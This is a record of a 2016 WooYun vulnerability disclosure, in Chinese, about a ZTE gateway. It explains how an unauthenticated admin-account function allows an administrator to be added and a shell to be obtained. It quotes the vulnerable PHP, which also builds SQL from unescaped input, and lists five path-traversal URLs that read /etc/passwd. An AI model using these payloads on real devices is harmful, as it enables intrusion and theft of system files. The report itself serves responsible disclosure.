{"id": 88219, "wybug_id": "wooyun-2016-0191136", "wybug_title": "中兴某网关设备后台绕过可Shell+N处任意文件下载漏洞合集                                      ", "wybug_corp": "中兴通讯股份有限公司", "wybug_author": "pandas", "wybug_date": "2016-03-31 17:43", "wybug_open_date": "2016-06-30 09:10", "wybug_type": "权限控制绕过", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-04：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-05-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-30：\t细节向公众公开  简要描述： 中兴某网关设备通用型后台绕过可getshell+N处任意文件下载 详细说明：  该后台绕过有2种利用方式，原理其实差不多，就不刷漏洞了：）一、越权添加任意管理员账户登录后台二、越权编辑原admin用户，修改其密码登录后台直接以第一种情况来作演示，毕竟第二种情况比较暴力。漏洞文件 modules/admin/admin_account.be.php:\nfunction admin_account_add($post) {    global $db;    global $res;    global $lang;    if(!ci($post['txt_name'], 'name',3,20)){        $res->set_resultcode('-2');        $res->set_resultstr($lang['user'].':'.$lang['namereq3']);        return;    }    if(!ci($post['t_name'],'realname',3,20)){        $res->set_resultcode('-2');        $res->set_resultstr($lang['realname'].':'.$lang['error_realname']);        return;    }    if(!ci($post['t_dept'],'realname',0,20)){        $res->set_resultcode('-2');        $res->set_resultstr($lang['dept'].':'.$lang['error_realname2']);        return;    }    if(!ci($post['email'],'email')){        $res->set_resultcode('-2');        $res->set_resultstr($lang['email'].':'.$lang['error_email']);        return;    }    if(!ci($post['t_desc'],'realname',0,100)){        $res->set_resultcode('-2');        $res->set_resultstr($lang['desc'].':'.$lang['error_role_desc']);        return;    }    if($post['sel_role']==\"-1\"){        $res->set_resultcode('-2');        $res->set_resultstr($lang['emptyform'].\":\".$lang['adminrole']);        return;    }    if(!ci($post['pas_password'], 'uaname',5,20)){        $res->set_resultcode('-2');        $res->set_resultstr($lang['password'].':'.$lang['admin_pwd_error']);        return;    }    if($post['pas_password'] != $post['pas_password2']){        $res->set_resultcode('-2');        $res->set_resultstr($lang['rtpass'].':'.$lang['passerr']);        return;    }    $count=$db->countOf(\"oft_operators\", \"name= binary '\".$post['txt_name'].\"'\");    if($count>0){        $res->set_resultcode('-2');        $res->set_resultstr($lang['dupname']);        return;    }        $sql0=\"insert into oft_operators (name, realname, department, contact, descript, password, state, user_type, role_id,email) values ('\".$post['txt_name'].\"', '\".$post['t_name'].\"', '\".$post['t_dept'].\"', '\".$post['t_contact'].\"', '\".$post['t_desc'].\"', '\".md5($post['pas_password']).\"', '\".(isset($post['chk_state']) ? 1:0).\"', '\".$post['object_type'].\"', '\".$post['sel_role'].\"', '\".$post['email'].\"')\";    $db->execute($sql0);    $new_id=$db->lastInsertedId();    $sqla=array();    if($post['object_type']=='1' || $post['object_type']=='2') {        for($i=count($post['sel_obj']);$i>0;$i--){            $sqla[]=\"insert into oft_oper_user values('\".$new_id.\"','\".$post['sel_obj'][$i-1].\"')\";        }    }    $db->execute('start transaction');    foreach($sqla as $sqlstr) {        if(!$db->execute($sqlstr)) {            $db->execute('rollback');            $res->set_resultcode('-4');            $res->set_resultstr($lang['dberr']);            return;        }    }    $db->execute(\"commit\");    $GLOBALS['logs']->writelog(CATEGORY_OPERATE,'Add','Add account '.$post['t_name'],$post['hid_path'],'Add account');    $res->set_resultcode('0');    $res->set_resultstr($lang['success']);}\n该文件可未授权访问，而上述功能代码可直接添加一管理员用户：\n\n如图所示 新增了一个 test123 密码为123456的管理员。不过这里有个小坑，直接添加虽然页面返回的是添加成功，但是实际上并不能登录成功，还需要新增一个管理组：漏洞文件：modules/admin/admin_role.be.php代码不贴了，和上面的逻辑类似，挖过这套系统的应该已经很清楚怎么利用了，没有挖过的可以看测试代码区，里面有该漏洞的完整利用代码。\n\n这时候使用我们新增的test123可成功登录管理后台:\n\n可getshell，登录后的漏洞一大把，就不刷漏洞了，具体上传getshell可以看modules/system/sys_backuprestore.be.php这个文件：\n\n利用代码请看测试代码区   漏洞证明：  顺带发现几处文件下载，不再分析代码，直接给出利用代码：（可能有重复的，有劳审核备注下）1.  **.**.**.**/modules/system/download.php?file=/etc/passwd2. **.**.**.**/download.php?filename=passwd&id=../../../../../../../../../etc/passwd3. **.**.**.**/modules/audit/email_download.php?file=/etc/passwd    4. **.**.**.**/modules/audit/download.php?file=/etc/passwd5. **.**.**.**/modules/service/download.php?id=/../../../../../../../etc/passwd&file=1更多通用案例详见前辈们提交的案例http://**.**.**.**/bugs/wooyun-2010-0189550：）   修复方案：  不仅要验证用户权限，也要做好过滤。   版权声明：转载请注明来源 pandas@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-04-01 09:02 厂商回复： 我爱合集…… 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}